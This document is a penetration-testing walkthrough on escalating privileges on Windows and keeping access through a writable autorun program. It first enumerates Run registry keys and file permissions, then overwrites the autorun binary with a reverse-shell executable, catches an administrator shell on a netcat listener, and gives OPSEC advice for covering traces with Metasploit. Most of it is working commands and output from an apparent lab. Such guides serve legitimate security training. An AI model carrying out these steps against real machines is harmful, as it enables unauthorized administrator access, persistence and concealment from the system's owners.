# 01 - Manual Autorun Exploitation

Just like we've explained before that it's all about misconfigurations. However, this method is also related to persistence method when the system was shutdown or rebooted by the user. We can use this to maintain access to continue our post-exploitation activities.

## 1.1 - Detect

### 1.1.1 - Command Prompt

```
C:\> wmic startup list full

..[snip]..
Caption=My Program
Command="C:\Program Files\Autorun Program\program.exe"
Description=My Program
Location=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
SettingID=
User=Public

C:\> autorunsc.exe -m -nobanner -a * -ct /accepteula
```

This is often the default registry value that all Windows operating systems have. Run this command of the full registry default path.

```
C:\> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
    My Program    REG_SZ    "C:\Program Files\Autorun Program\program.exe"

C:\> icacls "C:\Program Files\Autorun Program\program.exe"
C:\Program Files\Autorun Program\program.exe Everyone:(F)
                                             NT AUTHORITY\SYSTEM:(F)
                                             BUILTIN\Administrators:(F)
                                             WIN-QBA94KB3IOF\Administrator:(F)
                                             NT AUTHORITY\SYSTEM:(I)(F)
                                             BUILTIN\Administrators:(I)(F)
                                             BUILTIN\Users:(I)(RX)
                                             APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                             APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

```
C:\> accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"

AccessChk v4.02 - Check access of files, keys, objects, processes or services
Copyright (C) 2006-2007 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Program Files\Autorun Program\program.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
  RW WIN-QBA94KB3IOF\Administrator
        FILE_ALL_ACCESS
  RW BUILTIN\Users
        FILE_ALL_ACCESS
```

### 1.1.2 - Powershell

This is often the default registry value that all Windows operating systems have. Run this cmdlet of the full registry default path.

```
PS C:\> get-itemproperty -path registry::hklm\software\microsoft\windows\currentversion\run


SecurityHealth : C:\Windows\system32\SecurityHealthSystray.exe
My Program     : "C:\Program Files\Autorun Program\program.exe"
PSPath         : Microsoft.PowerShell.Core\Registry::hklm\software\microsoft\windows\currentversion\run
PSParentPath   : Microsoft.PowerShell.Core\Registry::hklm\software\microsoft\windows\currentversion
PSChildName    : run
PSProvider     : Microsoft.PowerShell.Core\Registry

PS C:\> get-childitem "C:\Users\All Users\Start Menu\Programs\Startup"

PS C:\> get-childitem C:\Users\$env:USERNAME\Start Menu\Programs\Startup"

PS C:\> get-acl "C:\Program Files\Autorun Program\program.exe" | fl"


Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\Autorun Program\program.exe
Owner  : BUILTIN\Administrators
Group  : WIN-QBA94KB3IOF\None
Access : Everyone Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         WIN-QBA94KB3IOF\Administrator Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
Audit  : 
Sddl   : O:BAG:S-1-5-21-3025105784-3259396213-1915610826-513D:AI(A;;FA;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)(A;;FA;;;LA)(A;ID;F
         A;;;SY)(A;ID;FA;;;BA)(A;ID;0x1200a9;;;BU)(A;ID;0x1200a9;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)

PS C:\> $acl = get-acl "C:\Program Files\Autorun Program\program.exe"
PS C:\> convertfrom-sddlstring -sddl $acl.sddl | foreach-object {$_.DiscretionaryAcl}
Everyone: AccessAllowed (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, FullControl, FullControl, FullControl, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
NT AUTHORITY\SYSTEM: AccessAllowed (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, FullControl, FullControl, FullControl, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
BUILTIN\Administrators: AccessAllowed (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, FullControl, FullControl, FullControl, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
WIN-QBA94KB3IOF\Administrator: AccessAllowed (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, FullControl, FullControl, FullControl, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
NT AUTHORITY\SYSTEM: AccessAllowed Inherited (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, FullControl, FullControl, FullControl, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
BUILTIN\Administrators: AccessAllowed Inherited (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, FullControl, FullControl, FullControl, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
BUILTIN\Users: AccessAllowed Inherited (GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, Traverse)
APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES: AccessAllowed Inherited (GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, Traverse)
APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES: AccessAllowed Inherited (GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, Traverse)
```

## 1.2 - Exploit

Backup the binary file and override it with a callback shell.

```
C:\> copy "C:\Program Files\Autorun Program\program.exe" program.bak

C:\> copy /y shell.exe "C:\Program Files\Autorun Program\program.exe"
```

Start a shell handler

`$ sudo nc -lnvp 53`

This is just to simulate that an administrator user will login. The attacker must wait in order to receive a callback shell.

```
$ xfreerdp /u:<username> /p:<password> /cert:ignore /v:<IP>

$ rdesktop -u <username> -p <password> <IP>

$ sudo nc -lnvp 53
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53
Ncat: Connection from 10.10.195.194.
Ncat: Connection from 10.10.195.194:49679.
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
win-qba94kb3iof\admin
C:\Windows\system32> net user %username%
User name                    admin
Full Name
Comment
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            8/19/2020 10:05:42 AM
Password expires             Never
Password changeable          8/19/2020 10:05:42 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/25/2022 5:41:33 PM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Users
Global Group memberships     *None
The command completed successfully.
```

Now the problem is through this netcat handler we can't revert back to it's original binary file. However, once you perform this technique use metasploit framework as a shell handler since it is easily can be migrated to another process and to revert back just like I've previously demonstrated when covering your traces. Take this OPSEC measure into account.

```
C:\Windows\system32> copy /y program.bak "C:\Program Files\Autorun Program\program.exe"
The process cannot access the file because it is being used by another process.
        0 file(s) copied.
```

## References

- [Privilege Escalation with Autorun Binaries](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries)